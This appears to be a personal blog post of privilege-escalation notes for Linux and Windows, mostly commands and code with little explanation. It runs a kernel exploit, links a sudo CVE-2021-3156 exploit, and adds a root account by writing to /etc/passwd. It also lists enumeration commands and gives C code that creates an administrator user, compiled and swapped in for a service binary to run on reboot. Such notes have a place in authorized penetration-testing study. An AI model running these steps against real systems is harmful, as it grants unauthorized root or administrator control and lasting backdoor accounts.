---
layout: post
title:  "privesc - linux - general"
date:   2022-01-01
categories: linux
---

## Ubuntu 11.10

```
$ cat /etc/issue
Ubuntu 11.10 \n \l

$ gcc memodipper.c -o mem
$ chmod +x mem
$ ./mem
```

## Sudo exploit CVE-2021-3156 - linpeas

```bash
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_userspec.py
```

## writable /etc/passwd

```bash
openssl passwd evil
<password>
```

```
echo "root2:<password>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

```
Password: evil
```

## windows

```bash
whoami
net user <username>
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
tasklist /SVC
ipconfig /all
route print
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
schtasks /query /fo LIST /v
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
mountvol

powershell --> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## Insecure File Permissions

- listing running services

```bash
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

- file permission

```bash
icacls "C:\Program Files\path\to\suspicious.exe"
```

kali build the exploit code

- exploit code

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}
```

```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```


#### windows replace the original exe with the malicious one

```
move "C:\Program Files\path\to\suspicious.exe" "C:\Program Files\path\to\suspicious_old.exe"
```

```
move adduser.exe "C:\Program Files\path\to\suspicious.exe"
```

```
dir "C:\Program Files\path\to\"
```

##### restart the service

```
net stop suspicious
System error 5 has occurred.

Access is denied.
```

Unfortunately, it seems that we do not have enough privileges to stop the suspicious service. This is expected as most services are managed by administrative users.


```bash
wmic service where caption="suspicious" get name, caption, state, startmode
```

```bash
Caption     Name     StartMode  State
suspicious  suspicious  Auto       Running
```

```bash
whoami /priv
...
SeShutdownPrivilege           Shut down the system                 Disabled
```

```bash
shutdown /r /t 0
```

## UAC



## linux

```
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/*-release
uname -a
ps aux
netstat -ano
ip a
/sbin/route
ss -anp
ls -lah /etc/cron*
cat /etc/crontab
dpkg -l
find / -writable -type d 2>/dev/null
cat /etc/fstab --> mount
/bin/lsblk
lsmod --> /sbin/modinfo <filename given from lsmod>
find / -perm -u=s -type f 2>/dev/null